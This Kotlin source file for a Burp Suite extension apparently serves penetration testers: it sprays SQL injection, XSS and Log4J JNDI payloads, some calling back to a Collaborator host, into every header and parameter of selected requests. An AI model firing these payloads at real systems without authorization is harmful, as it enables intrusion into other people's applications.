package com.nickcoblentz.montoya

import burp.api.montoya.BurpExtension
import burp.api.montoya.MontoyaApi
import burp.api.montoya.http.RedirectionMode
import burp.api.montoya.http.RequestOptions
import burp.api.montoya.http.message.HttpRequestResponse
import burp.api.montoya.http.message.params.HttpParameter
import burp.api.montoya.http.message.params.HttpParameterType
import burp.api.montoya.http.message.params.ParsedHttpParameter
import burp.api.montoya.http.message.requests.HttpRequest
import burp.api.montoya.http.message.responses.HttpResponse
import burp.api.montoya.ui.contextmenu.AuditIssueContextMenuEvent
import burp.api.montoya.ui.contextmenu.ContextMenuEvent
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider
import burp.api.montoya.ui.contextmenu.WebSocketContextMenuEvent
import burp.api.montoya.utilities.Base64EncodingOptions
import com.nickcoblentz.montoya.settings.*
import java.awt.Component
import java.awt.event.ActionEvent
import java.util.concurrent.Executors
import javax.swing.JMenuItem

enum class PayloadType {
    REPLACE,
    MIDDLE,
    BEGINNING,
    END
}

class EveryParameter : BurpExtension, ContextMenuItemsProvider {

    private lateinit var logger: MontoyaLogger
    private lateinit var api: MontoyaApi
    private val sqliQuickMenuItem = JMenuItem("SQLi Quick")
    private val sqliLogicPayloadsMenuItem = JMenuItem("SQLi Logic Payloads")
    private val sqliConcatPayloadsMenuItem = JMenuItem("SQLi Concat Payloads")
    private val sqliSingleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi SingleQuoteCommentPayloads")
    private val sqliDoubleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi DoubleQuoteCommentPayloads")
    private val sqliErrorPayloadsMenuItem = JMenuItem("SQLi ErrorPayloads")
    private val xssMapMenuItem = JMenuItem("XSS ASDF")
    private val xssPayloadsMenuItem = JMenuItem("XSS Payloads")
    private val blindXssImgMenuItem = JMenuItem("XSS Blind Img")
    private val collabUrlMenuItem = JMenuItem("Collab Url")
    private val log4jCollabMenuItem = JMenuItem("Log4J Collab")
    private val minimizeMenuItem = JMenuItem("Minimize")
    private val allMenuItems = mutableListOf<Component>(sqliQuickMenuItem,sqliErrorPayloadsMenuItem,sqliConcatPayloadsMenuItem,sqliSingleQuoteCommentPayloadsMenuItem,sqliDoubleQuoteCommentPayloadsMenuItem,sqliLogicPayloadsMenuItem,xssMapMenuItem,xssPayloadsMenuItem,blindXssImgMenuItem,collabUrlMenuItem,log4jCollabMenuItem,minimizeMenuItem)
    private var currentHttpRequestResponseList = mutableListOf<HttpRequestResponse>()
    private val executor = Executors.newVirtualThreadPerTaskExecutor()
    private lateinit var followRedirectSetting : BooleanExtensionSetting
    private lateinit var ignoreParametersSetting : ListStringExtensionSetting

    companion object {
        private const val PLUGIN_NAME: String = "Every Parameter"
    }

    override fun initialize(api: MontoyaApi?) {
        requireNotNull(api) {"api : MontoyaApi is not allowed to be null"}

        this.api = api
        logger = MontoyaLogger(api,LogLevel.DEBUG)

        logger.debugLog("Starting...")
        api.extension().setName(PLUGIN_NAME)
        api.userInterface().registerContextMenuItemsProvider(this)
        sqliQuickMenuItem.addActionListener({ e -> sqliQuickActionPerformed(e) })
        sqliLogicPayloadsMenuItem.addActionListener({ e -> sqliLogicPayloadsActionPerformed(e) })
        sqliConcatPayloadsMenuItem.addActionListener({ e -> sqliConcatPayloadsActionPerformed(e) })
        sqliSingleQuoteCommentPayloadsMenuItem.addActionListener({ e -> sqliSingleQuoteCommentPayloadsActionPerformed(e) })
        sqliDoubleQuoteCommentPayloadsMenuItem.addActionListener({ e -> sqliDoubleQuoteCommentPayloadsActionPerformed(e) })
        sqliErrorPayloadsMenuItem.addActionListener({ e -> sqliErrorPayloadsActionPerformed(e) })
        xssMapMenuItem.addActionListener({ e -> xssMapActionPerformed(e) })
        xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
        xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
        blindXssImgMenuItem.addActionListener({ e -> blindXssImgActionPerformed(e) })
        collabUrlMenuItem.addActionListener({ e -> collabUrlActionPerformed(e) })
        minimizeMenuItem.addActionListener({ e -> minimizeActionPerformed(e) })
        log4jCollabMenuItem.addActionListener({ e -> log4jCollabActionPerformed(e) })
        followRedirectSetting = BooleanExtensionSetting(
            api,
            "Follow Redirects?",
            "everyparam.followRedirect",
            false,
            ExtensionSettingSaveLocation.PROJECT)
        ignoreParametersSetting = ListStringExtensionSetting(
            api,
            "Ignore the following Parameters",
            "everyparam.ignoreParam",
            mutableListOf<String>(),
            ExtensionSettingSaveLocation.PROJECT
        )
        val formGenerator = GenericExtensionSettingsFormGenerator(listOf(followRedirectSetting,ignoreParametersSetting),PLUGIN_NAME)
        val settingsFormBuilder = formGenerator.getSettingsFormBuilder()
        val settingsForm = settingsFormBuilder.run()
        api.userInterface().registerContextMenuItemsProvider(ExtensionSettingsContextMenuProvider(api, settingsForm))
        logger.debugLog("...Finished")
    }

    override fun provideMenuItems(event: ContextMenuEvent?): MutableList<Component> {
        if(event?.selectedRequestResponses()?.size!!>0)
            currentHttpRequestResponseList=event.selectedRequestResponses()
        else if(event?.messageEditorRequestResponse()?.isPresent==true)
            currentHttpRequestResponseList=mutableListOf(event.messageEditorRequestResponse().get().requestResponse())

        logger.debugLog("Found ${currentHttpRequestResponseList.size} requests")
        if(currentHttpRequestResponseList.size>0)
            return allMenuItems
        return mutableListOf<Component>()
    }

    override fun provideMenuItems(event: WebSocketContextMenuEvent?): MutableList<Component> {
        return mutableListOf<Component>()
    }

    override fun provideMenuItems(event: AuditIssueContextMenuEvent?): MutableList<Component> {
        return mutableListOf<Component>()
    }


    fun sqliQuickActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"SLEEP(10) /*' or SLEEP(10) or'\" or SLEEP(10) or \"*/",PayloadType.END, "SQLi Polyglot \"")
        logger.debugLog("Exit")
    }

    fun sqliLogicPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadType.END, "SQLi boolean a'")
        iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadType.END, "SQLi boolean 1'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadType.END, "SQLi boolean a\"")
        iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadType.END, "SQLi boolean 1\"")
        logger.debugLog("Exit")
    }

    fun sqliConcatPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'+'",PayloadType.MIDDLE, "SQLi concat +'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'||'",PayloadType.MIDDLE, "SQLi concat ||'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"' '",PayloadType.MIDDLE, "SQLi concat space'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"+\"",PayloadType.MIDDLE, "SQLi concat +\"")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"||\"",PayloadType.MIDDLE, "SQLi concat ||\"")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\" \"",PayloadType.MIDDLE, "SQLi concat space\"")
        logger.debugLog("Exit")
    }

    fun sqliSingleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'-- ",PayloadType.END, "SQLi comment'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"')-- ",PayloadType.END, "SQLi comment)'")
        logger.debugLog("Exit")
    }

    fun sqliDoubleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"-- ",PayloadType.END, "SQLi comment'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\")-- ",PayloadType.END, "SQLi comment)'")
        logger.debugLog("Exit")
    }

    fun sqliErrorPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"",PayloadType.END, "SQLi '\"")
        logger.debugLog("Exit")
    }

    fun xssMapActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\">asdf",PayloadType.END, "XSS asdf")
        logger.debugLog("Exit")
    }

    fun blindXssImgActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><img src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/blindimg.png\">asdf",PayloadType.END, "Bind XSS Img")
        logger.debugLog("Exit")
    }

    fun collabUrlActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/collaburl",PayloadType.REPLACE, "Collab URL")
        logger.debugLog("Exit")
    }

    fun log4jCollabActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:ldap://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadType.REPLACE, "log4j ldap")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:dns://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadType.REPLACE, "log4j dns")
        logger.debugLog("Exit")
    }

    fun xssPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><h2>heading here</h2>asdfh2",PayloadType.END, "XSS h2")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><script>alert(1)</script>asdfalert",PayloadType.END, "XSS Alert")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadType.END, "XSS UTF7")
        logger.debugLog("Exit")
    }

    fun minimizeActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        executor.submit {

            for (httpRequestResponse in myHttpRequestResponses) {
                if (httpRequestResponse.hasResponse()) {
                    for (httpRequestResponse in myHttpRequestResponses) {
                        val originalRequest = httpRequestResponse.request()
                        val originalResponse = httpRequestResponse.response()
                        var currentRequest = originalRequest

                        for (header in currentRequest.headers()) {
                            val modifiedRequest = currentRequest.withRemovedHeader(header)
                            val httpRequestResponseResult = api.http().sendRequest(modifiedRequest)
                            if (responsesAreSimilar(originalResponse, httpRequestResponseResult.response()))
                                currentRequest = modifiedRequest
                        }

                        val supportedParamaterTypes = listOf(
                            HttpParameterType.URL,
                            HttpParameterType.BODY,
                            HttpParameterType.COOKIE,
                            HttpParameterType.MULTIPART_ATTRIBUTE
                        )
                        for (parameter in currentRequest.parameters()) {

                            if (supportedParamaterTypes.contains(parameter.type())) {
                                val modifiedRequest = currentRequest.withRemovedParameters(parameter)
                                val httpRequestResponseResult = sendRequestConsiderSettings(modifiedRequest)
                                if (responsesAreSimilar(originalResponse, httpRequestResponseResult.response()))
                                    currentRequest = modifiedRequest
                            }
                        }

                        api.repeater().sendToRepeater(currentRequest)
                        api.comparer().sendToComparer(originalRequest.toByteArray(),currentRequest.toByteArray())
                    }
                } else
                    logger.errorLog("Skipping mimize request because it doesn't have a response to compare to")
            }
        }
        //iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadType.END, "XSS UTF7")
        logger.debugLog("Exit")
    }

    fun responsesAreSimilar(originalResponse: HttpResponse, currentResponse : HttpResponse) : Boolean
    {
        if( (originalResponse.statusCode()==currentResponse.statusCode()) &&
            (originalResponse.reasonPhrase()==currentResponse.reasonPhrase()) &&
            (originalResponse.statedMimeType()==currentResponse.statedMimeType())) {
                return true
        }


        return false
    }


    fun iterateThroughParametersWithPayload(httpRequestResponses : List<HttpRequestResponse>, payload : String, type : PayloadType, annotation : String)
    {
        logger.debugLog("Enter")
        for(httpRequestResponse in httpRequestResponses)
        {
            val httpRequest = httpRequestResponse.request()
            logger.debugLog("Found request: ${httpRequest.url()}")

            for(header in httpRequest.headers()) {
                logger.debugLog("Found header: ${header.name()}, ${header.value()}")
                sendRequest(httpRequest.withUpdatedHeader(header.name(),api.utilities().urlUtils().encode(payload)),"header: ${header.name()}: $annotation")
            }

            for(parameter in httpRequest.parameters())
            {
                logger.debugLog("Found param: ${parameter.name()}, ${parameter.type()}, ${parameter.value()}")
                logger.debugLog("List of ignored values:\n${ignoreParametersSetting.currentValue}")

                if(!ignoreParametersSetting.currentValue.any { parameter.name().equals(it,ignoreCase = true) }) {
                    when (parameter.type()) {
                        HttpParameterType.URL ->
                            sendRequest(
                                httpRequest.withUpdatedParameters(
                                    createUpdatedParameter(
                                        parameter,
                                        api.utilities().urlUtils().encode(payload)
                                    )
                                ), "URL Param: ${parameter.name()}: $annotation"
                            )

                        HttpParameterType.BODY ->
                            sendRequest(
                                httpRequest.withUpdatedParameters(
                                    createUpdatedParameter(
                                        parameter,
                                        api.utilities().urlUtils().encode(payload)
                                    )
                                ), "Body Param: ${parameter.name()}: $annotation"
                            )

                        HttpParameterType.COOKIE ->
                            sendRequest(
                                httpRequest.withUpdatedParameters(
                                    createUpdatedParameter(
                                        parameter,
                                        api.utilities().urlUtils().encode(payload)
                                    )
                                ), "Cookie: ${parameter.name()}: $annotation"
                            )

                        HttpParameterType.MULTIPART_ATTRIBUTE ->
                            sendRequest(
                                httpRequest.withUpdatedParameters(createUpdatedParameter(parameter, payload)),
                                "mutipart Param: ${parameter.name()}: $annotation"
                            )

                        HttpParameterType.JSON ->
                            sendRequest(
                                matchReplaceParameterInRequest(
                                    httpRequest,
                                    parameter,
                                    payload.replace("\"", "\\\"")
                                ), "URL JSON: ${parameter.name()}: $annotation"
                            )

                        HttpParameterType.XML -> {
                            sendRequest(
                                matchReplaceParameterInRequest(
                                    httpRequest,
                                    parameter,
                                    api.utilities().htmlUtils().encode(payload)
                                ), "URL XML: ${parameter.name()}: $annotation"
                            )
                            sendRequest(
                                matchReplaceParameterInRequest(httpRequest, parameter, "<![CDATA[$payload]]>"),
                                "URL XML: ${parameter.name()}: $annotation"
                            )
                        }

                        HttpParameterType.XML_ATTRIBUTE ->
                            sendRequest(
                                matchReplaceParameterInRequest(
                                    httpRequest,
                                    parameter,
                                    api.utilities().htmlUtils().encode(payload)
                                ), "URL XML Attr: ${parameter.name()}: $annotation"
                            )

                        else -> Unit
                    }
                }
                else
                    logger.debugLog("Skipping ${parameter.name()}")

            }
        }
        logger.debugLog("Exit")
    }

    fun createUpdatedParameter(parsedParameter : ParsedHttpParameter,encodedPayload : String) : HttpParameter {
        logger.debugLog("Enter")
        return HttpParameter.parameter(parsedParameter.name(),encodedPayload,parsedParameter.type())
    }

    fun matchReplaceParameterInRequest(originalRequest : HttpRequest ,parsedParameter : ParsedHttpParameter,encodedPayload : String) : HttpRequest {
        return originalRequest.withBody(originalRequest.bodyToString().replace(parsedParameter.value(),encodedPayload))
    }
    fun sendRequest(httpRequest : HttpRequest, annotation : String)
    {
        logger.debugLog("Enter")
        executor.submit {
            val annotatedHttpRequest = httpRequest.withAddedHeader("x-everyparam",api.utilities().base64Utils().encode(annotation,Base64EncodingOptions.URL).toString())
            sendRequestConsiderSettings(annotatedHttpRequest)

        }
        logger.debugLog("Exit")
    }

    fun sendRequestConsiderSettings(httpRequest : HttpRequest) : HttpRequestResponse {
        if(followRedirectSetting.currentValue)
            return api.http().sendRequest(httpRequest,RequestOptions.requestOptions().withRedirectionMode(RedirectionMode.ALWAYS))
        else
            return api.http().sendRequest(httpRequest)
    }

}